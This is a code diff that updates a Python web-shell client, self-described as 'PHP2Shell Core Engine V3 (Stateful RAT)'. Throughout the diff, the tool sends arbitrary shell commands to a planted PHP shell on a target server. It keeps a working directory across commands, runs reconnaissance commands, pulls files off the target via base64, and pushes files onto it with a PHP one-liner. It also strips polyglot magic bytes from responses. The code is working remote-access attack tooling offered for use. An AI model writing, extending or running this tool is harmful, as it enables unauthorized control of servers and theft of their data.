@@ -1,144 +1,159 @@
-"""Modul PHP2Shell Core Engine — pindahan dari main.py legacy.
-
-Perubahan dari legacy:
-  - Import `os` dinaikkan ke atas (di legacy di-import di dalam fungsi).
-  
-Logika eksekusi, stateful `cd`, `upload`, `download`, dan sanitizer: IDENTIK 100%.
-"""
+"""PHP2Shell Core Engine V3 (Stateful RAT)."""
 import os
 import base64
-import requests
+import re
+from network.client import HTTPClient
 
 
-def run_php2shell_module():
+def _clean_output(text):
+    """Clean polyglot garbage (Magic Bytes & Signature)."""
+    if not text: return ""
+    # Remove signature
+    text = text.replace("TanPha-V3-Active", "")
+    # Remove non-printable characters (Magic Bytes)
+    text = "".join(c for c in text if c.isprintable() or c in "\n\r\t")
+    return text.strip()
+
+
+def run_php2shell_module(client: HTTPClient):
     print("-" * 60)
-    print(" [ Modul: PHP2Shell Enterprise Core & Stateful Command Engine ]")
+    print(" [ Module: PHP2Shell Enterprise Core & Stateful Command Engine ]")
     print("-" * 60)
-    print("[*] Engine tingkat lanjut dengan Stateful CD, Output Sanitizer, & Built-in Tools.")
     
-    shell_url = input("[?] Masukkan URL Web Shell aktif (contoh: http://target.com/uploads/shell.php): ").strip()
-    password_param = input("[?] Masukkan parameter POST eksekusi (default: cmd): ").strip()
-    if not password_param:
-        password_param = "cmd"
+    shell_url = input("[?] Enter active Web Shell URL (e.g., http://target.com/uploads/shell.php): ").strip()
+    password_param = input("[?] Execution POST parameter (default: cmd): ").strip() or "cmd"
 
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) TànPhá-Enterprise-RAT"
-    }
-
-    # Menyimpan state direktori aktif secara otonom (Stateful Directory Tracking)
-    current_dir = ""
+    # 1. Initialize directory using Marker to bypass garbage output
+    current_dir = "/"
     try:
-        init_res = requests.post(shell_url, data={password_param: "pwd"}, headers=headers, timeout=5, verify=False)
-        current_dir = init_res.text.strip().split("\n")[-1]
-    except:
+        init_payload = "echo '===INIT_START==='; pwd; echo '===INIT_END==='"
+        init_res = client.request("POST", shell_url, data={password_param: init_payload}, bypass_mutation=True)
+        
+        if init_res.success and init_res.response:
+            raw = init_res.response.text
+            if '===INIT_START===' in raw and '===INIT_END===' in raw:
+                # Extract actual path
+                path_raw = raw.split('===INIT_START===')[1].split('===INIT_END===')[0]
+                current_dir = _clean_output(path_raw).strip().split('\n')[-1]
+            else:
+                current_dir = "/app"
+    except Exception:
         current_dir = "/app"
 
-    print(f"\n[+] Sesi PHP2Shell Berhasil Dikunci ke Target!")
-    print(f"[*] Ketik perintah sistem, gunakan 'cd <path>' untuk berpindah folder,")
-    print(f"    atau gunakan built-in command: [sysinfo, upload <local>, download <remote>, exit]\n")
+    print(f"\n[+] PHP2Shell Session Locked onto Target!")
+    print(f"[*] Current Directory: {current_dir}")
+    print(f"[*] Type commands, use 'cd <path>', or built-in: [sysinfo, upload <local>, download <remote>, exit]\n")
 
     while True:
         try:
             prompt_path = current_dir if current_dir else "shell"
-            command = input(f"TànPhá-RAT:{prompt_path}# ").strip()
-            if not command:
-                continue
+            command = input(f"TanPha-RAT:{prompt_path}# ").strip()
+            if not command: continue
             
             lower_cmd = command.lower()
 
+            # ==========================================
+            # BUILT-IN COMMANDS
+            # ==========================================
             if lower_cmd == 'exit':
-                print("[*] Keluar dari sesi PHP2Shell.")
+                print("[*] Exiting PHP2Shell session.")
                 break
 
-            # 1. Built-in Command: SYSINFO (Ringkasan instan sistem target)
             if lower_cmd == 'sysinfo':
                 sys_payload = "uname -a; id; whoami; hostname; ifconfig || ip a"
-                res = requests.post(shell_url, data={password_param: sys_payload}, headers=headers, timeout=6, verify=False)
-                print("\n--- Target System Information ---")
-                print(res.text.strip())
-                print("-" * 35 + "\n")
+                res = client.request("POST", shell_url, data={password_param: sys_payload}, bypass_mutation=True)
+                if res.success and res.response:
+                    print("\n--- Target System Information ---")
+                    print(_clean_output(res.response.text))
+                    print("-" * 35 + "\n")
                 continue
 
-            # 2. Built-in Command: DOWNLOAD <remote_file>
             if lower_cmd.startswith('download '):
                 r_file = command.split(' ', 1)[1].strip()
-                print(f"[*] Mengunduh file dari target: {r_file}...")
+                print(f"[*] Downloading file: {r_file}...")
                 dl_payload = f"base64 {r_file}" if os.name != 'nt' else f"certutil -encode {r_file} stdout"
-                res = requests.post(shell_url, data={password_param: dl_payload}, headers=headers, timeout=8, verify=False)
+                res = client.request("POST", shell_url, data={password_param: dl_payload}, bypass_mutation=True)
                 
-                if res.status_code == 200 and len(res.text.strip()) > 0:
+                if res.success and res.response and len(res.response.text.strip()) > 0:
                     local_out = os.path.basename(r_file)
                     try:
-                        # Membersihkan output base64 dari sisa teks server
-                        clean_b64 = "".join([line for line in res.text.strip().split("\n") if not line.startswith("<?")])
+                        raw_b64 = _clean_output(res.response.text)
+                        # Only take lines that are purely base64 characters
+                        clean_b64 = "".join([line for line in raw_b64.split("\n") if re.match(r'^[A-Za-z0-9+/=]+$', line)])
                         decoded_data = base64.b64decode(clean_b64)
-                        with open(local_out, "wb") as f_out:
+                        with open(local_out, "wb") as f_out: 
                             f_out.write(decoded_data)
-                        print(f"[+] Berhasil mengunduh! Disimpan secara lokal sebagai: {local_out}\n")
+                        print(f"[+] Download successful! Saved locally as: {local_out}\n")
                     except Exception as e:
-                        print(f"[-] Gagal mendekode file download: {e}\n")
+                        print(f"[-] Failed to decode downloaded file: {e}\n")
                 else:
-                    print("[-] Gagal mengambil file atau file tidak ditemukan di target.\n")
+                    print("[-] Failed to retrieve file or file not found on target.\n")
                 continue
 
-            # 3. Built-in Command: UPLOAD <local_file>
             if lower_cmd.startswith('upload '):
                 parts = command.split(' ', 1)
                 if len(parts) < 2:
-                    print("[-] Format salah! Gunakan: upload <nama_file_lokal>\n")
+                    print("[-] Invalid format! Use: upload <local_file>\n")
                     continue
                 l_file = parts[1].strip()
                 if not os.path.exists(l_file):
-                    print(f"[-] File lokal '{l_file}' tidak ditemukan!\n")
+                    print(f"[-] Local file '{l_file}' not found!\n")
                     continue
 
-                print(f"[*] Mengunggah file lokal '{l_file}' ke server target...")
+                print(f"[*] Uploading local file '{l_file}' to target server...")
                 try:
                     with open(l_file, "rb") as f_in:
                         b64_data = base64.b64encode(f_in.read()).decode('utf-8')
-                    
-                    # Perintah PHP one-liner di server untuk menulis ulang file dari base64
                     upl_payload = f"php -r \"file_put_contents('{l_file}', base64_decode('{b64_data}'));\""
-                    res = requests.post(shell_url, data={password_param: upl_payload}, headers=headers, timeout=8, verify=False)
-                    print(f"[+] Proses upload selesai! Periksa folder target.\n")
+                    res = client.request("POST", shell_url, data={password_param: upl_payload}, bypass_mutation=True)
+                    print(f"[+] Upload process complete! Check target directory.\n")
                 except Exception as e:
-                    print(f"[-] Gagal mengunggah file: {e}\n")
+                    print(f"[-] Failed to upload file: {e}\n")
                 continue
 
-            # 4. Stateful Directory Tracking & CD Command Handler
             if lower_cmd.startswith('cd '):
                 target_folder = command.split(' ', 1)[1].strip()
-                stateful_cmd = f"cd {current_dir} && cd {target_folder} && pwd"
-                res = requests.post(shell_url, data={password_param: stateful_cmd}, headers=headers, timeout=5, verify=False)
-                new_path = res.text.strip().split("\n")[-1].strip()
-                if new_path.startswith('/'):
-                    current_dir = new_path
-                    print(f"[+] Direktori aktif berpindah ke: {current_dir}\n")
-                else:
-                    print(f"[-] Gagal berpindah direktori (Folder tidak ditemukan atau akses ditolak).\n")
+                # Use ';' instead of '&&' so if current_dir is invalid, pwd still runs
+                stateful_cmd = f"cd {current_dir} 2>/dev/null; cd {target_folder} && pwd"
+                res = client.request("POST", shell_url, data={password_param: stateful_cmd}, bypass_mutation=True)
+                
+                if res.success and res.response:
+                    clean_out = _clean_output(res.response.text)
+                    new_path = clean_out.split("\n")[-1].strip()
+                    if new_path.startswith('/') or new_path.startswith('\\'):
+                        current_dir = new_path
+                        print(f"[+] Changed directory to: {current_dir}\n")
+                    else:
+                        print(f"[-] Failed to change directory (Not found or access denied).\n")
                 continue
 
-            # 5. Standard Command Execution dengan Output Sanitizer (Marker Wrapper)
+            # ==========================================
+            # STANDARD COMMAND EXECUTION (Robust Marker)
+            # ==========================================
             marker_start = "===TP_START==="
             marker_end = "===TP_END==="
-            wrapped_command = f"cd {current_dir} && echo '{marker_start}' && ({command}) 2>&1 && echo '{marker_end}'"
+            # Use ';' to cd, so even if it errors, the marker still prints
+            wrapped_command = f"cd {current_dir} 2>/dev/null; echo '{marker_start}'; ({command}) 2>&1; echo '{marker_end}'"
 
-            response = requests.post(shell_url, data={password_param: wrapped_command}, headers=headers, timeout=6, verify=False)
-            raw_output = response.text
+            response = client.request("POST", shell_url, data={password_param: wrapped_command}, bypass_mutation=True)
+            
+            if response.success and response.response:
+                raw_output = response.response.text
+                
+                if marker_start in raw_output and marker_end in raw_output:
+                    sanitized = raw_output.split(marker_start)[1].split(marker_end)[0]
+                    sanitized = _clean_output(sanitized)
+                else:
+                    sanitized = _clean_output(raw_output)
 
-            if marker_start in raw_output and marker_end in raw_output:
-                sanitized_output = raw_output.split(marker_start)[1].split(marker_end)[0].strip()
-            else:
-                sanitized_output = raw_output.strip()
-
-            print("\n--- Output Eksekusi ---")
-            print(sanitized_output if sanitized_output else "[*] Perintah berhasil dieksekusi tanpa output teks.")
-            print("-----------------------\n")
+                print("\n--- Execution Output ---")
+                print(sanitized if sanitized else "[*] Command executed without text output.")
+                print("-----------------------\n")
 
         except KeyboardInterrupt:
-            print("\n[*] Sesi dihentikan oleh pengguna.")
+            print("\n[*] Session terminated by user.")
             break
         except Exception as e:
-            print(f"[-] Koneksi ke web shell gagal atau terputus: {e}")
+            print(f"[-] Connection to web shell failed or lost: {e}")
 
-    input("\nTekan Enter untuk kembali ke menu utama...")
+    input("\nPress Enter to return to main menu...")
